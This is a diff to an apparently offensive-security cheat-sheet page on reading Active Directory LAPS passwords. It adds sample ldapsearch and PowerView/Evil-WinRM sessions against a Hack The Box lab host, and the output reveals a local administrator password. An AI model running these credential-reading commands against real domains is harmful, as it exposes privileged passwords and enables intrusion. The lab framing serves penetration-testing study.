@@ -330,17 +330,62 @@ body.dark-mode #dynamicFormContainer button:hover {
 
 <button data-tabset="set1" data-tabcontent="tab2" >Windows</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ldapsearch -h &lt;TARGET&gt; -b &#39;DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -x -D &lt;USER&gt;@&lt;TARGET&gt; -w &#39;&lt;PASSWORD&gt;&#39; &#39;(ms-MCS-AdmPwd=*)&#39; ms-MCS-AdmPwd
-</span></span></span></code></pre></div></div>
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">ldapsearch -H ldap://&lt;TARGET&gt; -b &#39;DC=&lt;EXAMPLE&gt;,DC=&lt;COM&gt;&#39; -x -D &lt;USER&gt;@&lt;DOMAIN&gt; -w &#39;&lt;PASSWORD&gt;&#39; &#39;(ms-MCS-AdmPwd=*)&#39; ms-MCS-AdmPwd
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> ldapsearch -H ldap://10.10.10.240 -b <span class="s1">&#39;DC=LicorDeBellota,DC=HTB&#39;</span> -x -D bob@LicorDeBellota.htb -w <span class="s1">&#39;Test1234!@&#39;</span> <span class="s1">&#39;(ms-MCS-AdmPwd=*)&#39;</span> ms-MCS-AdmPwd
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> extended LDIF
+</span></span><span class="line"><span class="cl"><span class="gp">#</span>
+</span></span><span class="line"><span class="cl"><span class="c1"># LDAPv3</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> base &lt;<span class="nv">DC</span><span class="o">=</span>LicorDeBellota,DC<span class="o">=</span>HTB&gt; with scope subtree
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> filter: <span class="o">(</span>ms-MCS-AdmPwd<span class="o">=</span>*<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> requesting: ms-MCS-AdmPwd 
+</span></span><span class="line"><span class="cl"><span class="gp">#</span>
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl"><span class="c1"># PIVOTAPI, Domain Controllers, LicorDeBellota.htb</span>
+</span></span><span class="line"><span class="cl"><span class="go">dn: CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">ms-Mcs-AdmPwd: 2Vf5kP4Xvj5r605V616x
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> search reference
+</span></span><span class="line"><span class="cl"><span class="go">ref: ldap://ForestDnsZones.LicorDeBellota.htb/DC=ForestDnsZones,DC=LicorDeBell
+</span></span></span><span class="line"><span class="cl"><span class="go"> ota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> search reference
+</span></span><span class="line"><span class="cl"><span class="go">ref: ldap://DomainDnsZones.LicorDeBellota.htb/DC=DomainDnsZones,DC=LicorDeBell
+</span></span></span><span class="line"><span class="cl"><span class="go"> ota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> search reference
+</span></span><span class="line"><span class="cl"><span class="go">ref: ldap://LicorDeBellota.htb/CN=Configuration,DC=LicorDeBellota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> search result
+</span></span><span class="line"><span class="cl"><span class="go">search: 2
+</span></span></span><span class="line"><span class="cl"><span class="go">result: 0 Success
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="gp">#</span> numResponses: <span class="m">5</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> numEntries: <span class="m">1</span>
+</span></span><span class="line"><span class="cl"><span class="gp">#</span> numReferences: <span class="m">3</span>
+</span></span></code></pre></div></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><h4 id="1-import-powerview">1. Import PowerView</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\bob\Documents&gt; . .\PowerView.ps1
 </span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
 </span></span></code></pre></div><h4 id="3-read-laps-password">3. Read LAPS password</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd -Credential $cred
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\Users\bob\Documents&gt; Get-AdComputer -Filter * -Properties ms-Mcs-AdmPwd 
+</span></span></span><span class="line"><span class="cl"><span class="go"></span><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err">
+</span></span></span><span class="line"><span class="cl"><span class="err"></span><span class="go">DistinguishedName : CN=PIVOTAPI,OU=Domain Controllers,DC=LicorDeBellota,DC=htb
+</span></span></span><span class="line"><span class="cl"><span class="go">DNSHostName       : PivotAPI.LicorDeBellota.htb
+</span></span></span><span class="line"><span class="cl"><span class="go">Enabled           : True
+</span></span></span><span class="line"><span class="cl"><span class="go">ms-Mcs-AdmPwd     : 2Vf5kP4Xvj5r605V616x
+</span></span></span><span class="line"><span class="cl"><span class="go">Name              : PIVOTAPI
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectClass       : computer
+</span></span></span><span class="line"><span class="cl"><span class="go">ObjectGUID        : 98783674-e6a3-4d9e-87e3-efe5f31fabbf
+</span></span></span><span class="line"><span class="cl"><span class="go">SamAccountName    : PIVOTAPI$
+</span></span></span><span class="line"><span class="cl"><span class="go">SID               : S-1-5-21-842165252-2479896602-2762773115-1004
+</span></span></span><span class="line"><span class="cl"><span class="go">UserPrincipalName :
 </span></span></span></code></pre></div></div></p>
 
 </div></div>
